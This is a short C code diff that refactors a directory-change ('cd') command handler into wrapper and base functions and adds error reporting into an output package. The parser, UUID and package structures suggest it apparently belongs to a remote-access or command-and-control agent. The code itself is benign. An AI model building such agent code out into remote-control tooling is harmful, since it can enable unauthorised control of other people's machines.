@@ -1,8 +1,8 @@
-#include "cd.h"
-#include <windows.h>
+#include "WrapCd.h"
+#include "BaseCd.h"
 #include <string>
 
-BOOL executeCd(PParser arguments)
+BOOL wrapCd(PParser arguments)
 {
 
     SIZE_T uuidLength = 36;
@@ -18,14 +18,16 @@ BOOL executeCd(PParser arguments)
     // Temporary output to store the result
 	PPackage output = newPackage(0, FALSE);
     // Check if the directory exists before changing
-    if (SetCurrentDirectoryA(newDir))
+    BOOL success = baseCd(newDir);
+    if (!success)
     {
-        currentDirectory = newDir;  // Update global directory
-        return TRUE;
-    }
-    else
-    {
-        _err("[CD] Directory change failed");
+        char result[256];
+        snprintf(result, sizeof(result), "[CD] Error changing directory to %s !\n", newDir);
+        addString(output, result, FALSE);
         return FALSE;
     }
+
+    addString(output, newDir, FALSE);
+
+    return TRUE;
 }
